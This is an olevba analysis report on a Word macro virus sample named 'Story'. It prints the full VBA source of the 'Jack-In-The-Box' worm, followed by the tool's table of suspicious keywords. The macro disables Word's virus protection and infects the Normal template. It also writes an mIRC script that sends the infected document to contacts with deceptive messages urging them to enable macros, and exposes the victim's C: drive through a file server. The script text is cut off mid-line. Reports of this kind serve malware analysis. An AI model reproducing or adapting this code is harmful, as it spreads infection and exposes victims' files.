olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Story-200cd1662aae892fea7d46635a47fceb776d6902
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Story-200cd1662aae892fea7d46635a47fceb776d6902 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'Jack-In-The-Box
Set Something = Options
Something.VirusProtection = 1
Something.ConfirmConversions = 1
Something.SaveNormalPrompt = 1
Application.EnableCancelKey = 1
Application.StatusBar = 1
Application.ScreenUpdating = 1
Set AnI = ActiveDocument.VBProject.VBComponents(1)
Set BnI = NormalTemplate.VBProject.VBComponents(1)
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
If UCase(BnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InB = 1
If InA = 1 And InB = 1 Then Exit Sub
Set CnI = MacroContainer.VBProject.VBComponents.Item(1)
VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
If InA = 1 Then BnI.CodeModule.AddFromString ("Private Sub Document_Close" & Chr(13) & VCode)
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
NormalTemplate.Save
somename = ActiveDocument.Name
DoEvents
If InB = 1 Then
If Dir("C:\mirc\mirc32.exe") <> "" Then
var3 = "C:\mirc\script.ini"
If System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
If Dir(var3) <> "" Then Kill var3
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu "
Print #1, "n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }"
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
Print #1, "n3=On 1:Unotify: .clear -s"
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
Print #1, "n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }"
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
DoEvents
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
Print #1, "n8=On 1:Text:*script*:*: .ignore $nick"
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
Print #1, "n10=On 1:Text:*virus*:*: .ignore $nick"
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
Print #1, "n12=On 1:Te"
If Left(somename, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
CommandBars("Tools").Controls("Macro").Enabled = 1
CommandBars("Tools").Controls("Customize...").Enabled = 1
CommandBars("View").Controls("Toolbars").Enabled = 1
CommandBars("View").Controls("Status Bar").Enabled = 1
End If
End Sub





























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

